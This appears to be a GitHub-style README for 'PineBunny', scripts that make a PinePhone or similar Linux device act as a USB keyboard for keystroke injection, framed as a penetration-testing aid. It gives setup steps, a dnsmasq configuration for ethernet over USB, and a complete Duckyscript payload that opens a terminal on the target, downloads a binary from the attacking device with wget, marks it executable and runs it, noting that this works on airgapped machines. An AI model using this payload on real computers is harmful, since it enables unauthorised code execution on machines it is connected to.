# PineBunny

# An attempt to implement something similar to what a Bash Bunny does on the PinePhone (Pro)
### WARNING! Very Alpha state, right now it works only manually. Automation will be added in the future

This is a recollection of scripts to enable the virtual /dev/hidg0 device on USBGadget enabled kernels and perform keystroke injection attacks emulating a keyboard. This tool is mostly useful in penetration testing assesments and engagements and the ideal devices to use this with would be any kind of Raspberry Pi model/any single board linux computer for that matter, and the PinePhone (Pro) or any other linux phone with a compatible kernel.
Even though those devices are the best ones to use, the tool should work on any device as long as it has USBGadget enabled.


# ¿How to check if my kernel is compatible?

To see if your kernel was compiled with USBGadget enabled, you can typically check the file "/proc/config.gz" to see your current kernel configuration.
Do `gunzip -c /proc/config.gz | grep CONFIG_USB_GADGET=` and check if it ends in `y`. If not you'll have to recompile the kernel yourself and enable it; which is beyond the scope of this repository.


# Installation

To install the scripts clone the repositoryy first and cd into it, and then simply compile usleep and hid-gadget-test:
`gcc -o hid-gadget-test.c hid-gadget-test`
`gcc -o usleep.c usleep`
Then, you can simply remove the .c files and copy the binaries to /usr/bin.
Keep in mind you'll need a different 'badusb' binary for each keyboard layout, so copy the one for your keyboard like so:
`sudo cp badusb-[YOUR_LAYOUT] /usr/bin/badusb`

Only en_US and es_ES are supported right now, I'll work on more layouts when I get the time.


# Usage

The badusb script uses conventional Duckyscript, and its usage is:

`sudo mkhidg0` (you need to enable /dev/hidg0 first, tho mkhidg0 also enables the ecm module of USB Gadget, so you'll have ethernet over USB, too. Just keep in mind that your target won't get an IP address automatically assigned without a proper dhcp server running. I personally like to use dnsmasq)
`sudo badusb duckypayload.txt`


# Example payload using HID + Ethernet

By default, `mkhidg0` enables HID and ethernet over usb. The only downside right now is that it isn't configured automatically, so you'll have to do it yourself. Let's look at an example:

Let's say we have a file we want the target to download and execute, a file hosted on the PinePhone itself (like `python -m http.server` for example).
We'll need to prepare the usb0 interface and a dhcp server so the computer gets an IP assigned: `sudo mkhidg0`, `sudo ifconfig usb0 up 10.0.0.1 netmask 255.255.255.0`. Then, the dhcp server with this `dnsmasq.conf` configuration:

```
interface=usb0
dhcp-range=10.0.0.2, 10.0.0.30, 255.255.255.0, 12h
dhcp-option=3, 10.0.0.1
dhcp-option=6, 10.0.0.1 
server=8.8.8.8
log-queries
log-dhcp 
listen-address=127.0.0.1
```
`sudo dnsmasq -C dnsmasq.conf -d` We leave that running and we also leave the web server running: `python -m http.server`. Now it should work. Our example payload file looks like this, and it is aimed at a regular linux desktop:

```
DELAY 2000
GUI
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING wget http://10.0.0.1:8000/hello
ENTER
DELAY 400
STRING chmod +x ./hello
ENTER
DELAY 100
STRING ./hello
ENTER
```
`sudo badusb payload.txt`

The cool thing is that it even works on airgapped computers!
